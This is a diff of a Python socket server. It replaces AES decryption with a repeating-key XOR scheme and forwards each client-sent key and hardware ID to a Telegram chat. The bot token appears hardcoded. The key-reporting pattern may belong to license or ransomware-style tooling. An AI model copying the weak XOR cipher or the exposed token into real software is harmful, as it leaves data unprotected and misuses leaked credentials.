@@ -7,8 +7,8 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import base64
 
-# Замените этот ключ на ваш сгенерированный AES-256 ключ
-ENCRYPTION_KEY = b'qP\xfc<\x8f#\xd2\x06M\xe1\x19\xb6\x1eX\x94\x19\x07\x02f\xda\xc4[O\x91\xda\xdb\xc1\xa7\xc2\x93]\xec'
+
+kdjeu_y = '0KzRkNGd0KHRltCq0ZjQqtGN'
 
 BOT_TOKEN = "7410613487:AAFZyzvqcQ7Xk_Mj2Lw2Os7c7rFD7Uv8xJs"
 CHAT_ID = 6749237131
@@ -58,30 +58,19 @@ def send_telegram_message(message):
     except requests.exceptions.RequestException as e:
         print(f"Error sending Telegram message: {e}")
 
-# Шифруем данные AES
-def encrypt_data(data, key):
-    cipher = AES.new(key, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
-    iv = base64.b64encode(cipher.iv).decode('utf-8')
-    ct = base64.b64encode(ct_bytes).decode('utf-8')
-    return iv + ct
 
-# Дешифруем данные AES
-def decrypt_data(data, key):
-    data = base64.b64decode(data)
-    iv = data[:AES.block_size]
-    ct = data[AES.block_size:]
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    pt = unpad(cipher.decrypt(ct), AES.block_size)
-    return pt.decode('utf-8')
+def decrypt(kdjeu_y, ciphertext):
+    ciphertext = base64.b64decode(ciphertext).decode()
+    result = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(ciphertext, kdjeu_y * len(ciphertext)))
+    return result
 
 # Обрабатываем запрос от клиента
 def handle_client(client_socket, address):
     try:
         data = client_socket.recv(1024)
-        decrypted_data = decrypt_data(data, ENCRYPTION_KEY)
+        decrypted_data = decrypt(kdjeu_y, data)
         key, hwid = decrypted_data.split("|")
-
+        send_telegram_message(f"получено {key} и {hwid}")
         try:
             external_ip = requests.get('https://api.ipify.org').text
         except requests.exceptions.RequestException as e:
